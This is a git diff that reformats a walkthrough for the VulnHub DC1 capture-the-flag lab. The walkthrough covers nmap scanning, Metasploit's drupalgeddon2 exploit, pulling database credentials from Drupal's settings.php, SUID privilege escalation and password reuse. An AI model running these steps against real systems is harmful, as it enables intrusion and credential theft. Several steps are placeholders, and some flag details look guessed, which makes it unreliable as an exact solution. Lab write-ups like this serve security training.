@@ -53,108 +53,110 @@ The objective is to exploit the DC1 VulnHub machine by identifying and capturing
   ```bash
   ping 10.0.200.6
 
-Information Gathering
-Perform an nmap scan to identify open ports and services:
-bash
-Copy code
-nmap -A -sC -oN dc.txt 10.0.200.6
-Enumerate the Web Application
-Access the web application running on port 80 and identify that it is using Drupal.
-Use Metasploit to find and exploit vulnerabilities in Drupal:
-bash
-Copy code
+### Information Gathering
+- Perform an nmap scan to identify open ports and services:
+`bash
+nmap -A -sC -oN dc.txt 10.0.200.6`
+
+### Enumerate the Web Application
+- Access the web application running on port 80 and identify that it is using Drupal.
+- Use Metasploit to find and exploit vulnerabilities in Drupal:
+`bash
 msfconsole
 search drupal
 use exploit/unix/webapp/drupal_drupalgeddon2
 set RHOSTS 10.0.200.6
-run
-Capture Initial Flag
-Once you gain a shell, navigate the file system to find the first flag:
-bash
+run`
+
+### Capture Initial Flag
+- Once you gain a shell, navigate the file system to find the first flag:
+`bash
 Copy code
 find / -name flag1.txt
-cat /path/to/flag1.txt
+cat /path/to/flag1.txt`
 Flag 1 Content: "Every good CMS needs a config file."
-Flag 2: Database Enumeration and Exploitation
+
+### Flag 2: Database Enumeration and Exploitation
 Objective: Identify and capture the second flag by exploiting the database.
 
-Identify Configuration Files
-Use the hint from Flag 1 to locate the Drupal configuration file:
-bash
-Copy code
-cat /var/www/html/sites/default/settings.php
-Find Database Credentials
-Extract database credentials from the configuration file.
-Connect to the Database
+#### Identify Configuration Files
+- Use the hint from Flag 1 to locate the Drupal configuration file:
+`bash
+cat /var/www/html/sites/default/settings.php`
+
+##### Find Database Credentials
+- Extract database credentials from the configuration file.
+
+##### Connect to the Database
 Use the credentials to connect to the MySQL database:
-bash
-Copy code
-mysql -u dbuser -p
-Enumerate Database and Capture Flag
-Enumerate the database to find the second flag:
-bash
-Copy code
+`bash
+mysql -u dbuser -p`
+
+##### Enumerate Database and Capture Flag
+- Enumerate the database to find the second flag:
+`bash
 show databases;
 use drupal;
 show tables;
-select * from flags;
+select * from flags;`
 Flag 2 Content: "Brute force and directory attacks aren't the only way to gain access."
-Flag 3: Privilege Escalation and System Enumeration
+
+### Flag 3: Privilege Escalation and System Enumeration
 Objective: Identify and capture the third flag by performing privilege escalation.
 
-Identify Weak Configurations
+##### Identify Weak Configurations
 Search for files with weak permissions or misconfigurations that could allow privilege escalation:
-bash
-Copy code
-find / -perm -4000 -type f 2>/dev/null
-Exploit Weakness
+`bash
+find / -perm -4000 -type f 2>/dev/null`
+
+##### Exploit Weakness
 Use tools like GTFOBins to escalate privileges:
-bash
-Copy code
-/path/to/vulnerable_binary
-Capture Third Flag
+`bash
+/path/to/vulnerable_binary`
+
+##### Capture Third Flag
 Once privileges are escalated, navigate the file system to find the third flag:
-bash
-Copy code
+`bash
 find / -name flag3.txt
-cat /path/to/flag3.txt
+cat /path/to/flag3.txt`
 Flag 3 Content: "There's more than one way to skin a cat."
-Flag 4: User Enumeration and Exploitation
+
+### Flag 4: User Enumeration and Exploitation
 Objective: Identify and capture the fourth flag by exploiting user credentials.
 
-Enumerate Users
+##### Enumerate Users
 List all users on the system and look for interesting files in their home directories:
-bash
-Copy code
+`bash
 cat /etc/passwd
-ls /home
-Check for Reused Passwords
+ls /home`
+
+##### Check for Reused Passwords
 Try using previously discovered passwords to switch to different users:
-bash
-Copy code
-su - username
-Capture Fourth Flag
+`bash
+su - username`
+
+##### Capture Fourth Flag
 Navigate the user's home directory to find the fourth flag:
-bash
-Copy code
+`bash
 find /home -name flag4.txt
-cat /path/to/flag4.txt
+cat /path/to/flag4.txt`
 Flag 4 Content: "You can use the same method to find or access the root flag."
-Final Flag: Root Privilege Escalation
+
+### Final Flag: Root Privilege Escalation
 Objective: Identify and capture the final flag by gaining root access.
 
-Identify Privilege Escalation Vector
+##### Identify Privilege Escalation Vector
 Look for misconfigurations or software vulnerabilities that allow root access.
 Use tools like LinPEAS or manual enumeration to identify vectors.
-Exploit and Gain Root Access
+
+##### Exploit and Gain Root Access
 Perform the privilege escalation to gain root access:
-bash
-Copy code
-/path/to/exploit
-Capture Final Flag
+`bash
+/path/to/exploit`
+
+##### Capture Final Flag
 Navigate to the root directory and find the final flag:
-bash
-Copy code
+`bash
 cd /root
-cat final_flag.txt
+cat final_flag.txt`
 Final Flag Content: "Well done! You have completed the DC1 challenge."
